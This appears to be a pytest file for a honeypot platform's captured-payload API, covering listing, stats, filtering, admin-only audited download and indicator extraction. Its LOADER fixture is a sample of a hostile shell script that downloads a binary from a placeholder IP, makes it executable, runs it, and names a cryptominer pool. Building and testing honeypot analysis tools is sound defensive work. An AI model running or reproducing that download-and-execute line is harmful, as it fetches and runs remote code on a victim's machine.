"""The read API over captured payloads."""

import base64
import hashlib
import os

import pytest
from sqlalchemy import select

from app.models import PayloadSample, UserRole
from app.services import artifacts, payload_enrichment

INGEST_HEADERS = {"X-Honeypot-Token": os.environ["HONEYPOT_INGEST_TOKEN"]}

LOADER = (
    b"#!/bin/sh\n"
    b"wget http://203.0.113.44/b -O /tmp/.m; chmod +x /tmp/.m; /tmp/.m\n"
    b"# xmrig stratum+tcp://pool.example.com:3333\n"
).strip()


async def _node(client, admin):
    r = await client.post(
        "/api/v1/nodes/", headers=admin,
        json={"name": "edge", "protocol": "ssh", "ip_address": "10.0.0.9", "port": 2222},
    )
    return r.json()["id"]


async def _ingest_with_payload(client, auth_headers, db_session, content=LOADER, analyse=True):
    # A distinct identity from any the test itself logs in as: make_user does a
    # plain insert, so reusing an email collides on the unique constraint.
    admin = await auth_headers(UserRole.ADMIN, email="ingest-admin@example.com")
    node_id = await _node(client, admin)
    upload = {
        "filename": "update.sh",
        "sha256": hashlib.sha256(content).hexdigest(),
        "size": len(content),
        "source": "ssh_shell",
        "content_b64": base64.b64encode(content).decode(),
    }
    session = {
        "protocol": "ssh", "attacker_ip": "203.0.113.77", "attacker_port": 40000,
        "started_at": "2026-02-02T02:02:00Z", "status": "completed",
        "duration_seconds": 12.0, "commands": ["cd /tmp"], "uploads": [upload],
    }
    r = await client.post(
        f"/api/v1/sessions/ingest-internal?node_id={node_id}",
        headers=INGEST_HEADERS, json=session,
    )
    assert r.status_code == 200, r.text
    if analyse:
        sample = (await db_session.execute(select(PayloadSample))).scalar_one()
        await payload_enrichment.analyse_sample(db_session, sample.id)
    return hashlib.sha256(content).hexdigest()


async def test_list_and_get_payload(client, auth_headers, db_session):
    sha = await _ingest_with_payload(client, auth_headers, db_session)
    headers = await auth_headers()

    listing = await client.get("/api/v1/payloads/", headers=headers)
    assert listing.status_code == 200, listing.text
    body = listing.json()
    assert body["total"] == 1
    row = body["payloads"][0]
    assert row["sha256"] == sha
    assert row["file_kind"] == "script"
    assert row["sessions_seen"] == 1

    detail = await client.get(f"/api/v1/payloads/{sha}", headers=headers)
    assert detail.status_code == 200
    data = detail.json()
    assert data["analysis_status"] == "complete"
    assert data["analysis"]["indicator_count"] >= 1
    assert data["content_available"] is True
    assert len(data["sessions"]) == 1
    assert data["sessions"][0]["source"] == "ssh_shell"


async def test_stats(client, auth_headers, db_session):
    await _ingest_with_payload(client, auth_headers, db_session)
    stats = await client.get("/api/v1/payloads/stats", headers=await auth_headers())
    assert stats.status_code == 200
    body = stats.json()
    assert body["total"] == 1
    assert body["by_kind"].get("script") == 1


async def test_filter_by_kind_and_status(client, auth_headers, db_session):
    await _ingest_with_payload(client, auth_headers, db_session)
    headers = await auth_headers()
    scripts = await client.get("/api/v1/payloads/?file_kind=script", headers=headers)
    assert scripts.json()["total"] == 1
    elves = await client.get("/api/v1/payloads/?file_kind=elf", headers=headers)
    assert elves.json()["total"] == 0
    complete = await client.get("/api/v1/payloads/?status=complete", headers=headers)
    assert complete.json()["total"] == 1


async def test_missing_sample_is_404(client, auth_headers):
    r = await client.get(f"/api/v1/payloads/{'0' * 64}", headers=await auth_headers())
    assert r.status_code == 404


async def test_download_is_admin_only_and_audited(client, auth_headers, db_session):
    sha = await _ingest_with_payload(client, auth_headers, db_session)

    viewer = await client.get(f"/api/v1/payloads/{sha}/download", headers=await auth_headers(UserRole.VIEWER))
    assert viewer.status_code == 403

    admin = await client.get(f"/api/v1/payloads/{sha}/download", headers=await auth_headers(UserRole.ADMIN))
    assert admin.status_code == 200
    assert admin.content == LOADER
    assert admin.headers["content-type"] == "application/octet-stream"
    assert admin.headers["x-content-type-options"] == "nosniff"
    assert sha in admin.headers["content-disposition"]


async def test_indicators_feed_includes_payload_iocs(client, auth_headers, db_session):
    await _ingest_with_payload(client, auth_headers, db_session)
    # The C2 recovered from inside the payload is a normal indicator now.
    feed = await client.get("/api/v1/iocs/?ioc_type=ip", headers=await auth_headers())
    values = {row["value"] for row in feed.json()["indicators"]}
    assert "203.0.113.44" in values
